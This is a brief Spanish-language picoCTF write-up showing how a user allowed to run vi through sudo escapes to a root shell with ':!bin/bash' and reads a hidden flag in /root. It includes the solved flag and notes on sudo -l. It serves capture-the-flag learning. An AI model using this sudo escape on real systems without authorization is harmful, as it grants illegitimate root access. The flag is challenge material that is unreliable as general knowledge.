## Objetivo
Can you read files in the root file?

Additional details will be available after launching your challenge instance.

## Solución
```bash
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi test
```
Al estar en vi agregamos el comando                                                                                                                                                                                                                                       
~                                                                                                                                                                                                                                          
~                                                                                                                                                                                                                                          
:!bin/bash
y enter
```
root@challenge:/home/picoplayer# whoami
root
root@challenge:/home/picoplayer# ls
root@challenge:/home/picoplayer# cd /root
root@challenge:~# ls
root@challenge:~# cd /root/
root@challenge:~# ls
root@challenge:~# ls -la
total 16
drwx------ 1 root root   22 Sep 14 04:34 .
drwxr-xr-x 1 root root   63 Sep 14 04:25 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  803 Sep 14 04:34 .viminfo
root@challenge:~# cat ./flag.txt
cat: ./flag.txt: No such file or directory
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
```
## Notas adicionales
**sudo -l** en Linux se utiliza para listar los privilegios de `sudo` que tiene el usuario actual. Muestra los comandos que el usuario está autorizado a ejecutar como superusuario o como otros usuarios específicos.

El comando **sudo vi test** en Linux hace lo siguiente:
	**`sudo`**: Ejecuta el siguiente comando con privilegios de superusuario (root), lo que te permite editar archivos que requieren permisos elevados.    
	**`vi`**: Es un editor de texto de línea de comandos que permite abrir y editar archivos. `vi` es un editor muy básico, pero potente, utilizado frecuentemente en sistemas Linux y Unix.    
	**`test`**: Es el nombre del archivo que quieres abrir. Si el archivo `test` ya existe, `vi` lo abrirá para editarlo. Si no existe, `vi` creará un nuevo archivo con ese nombre.


## Referencias
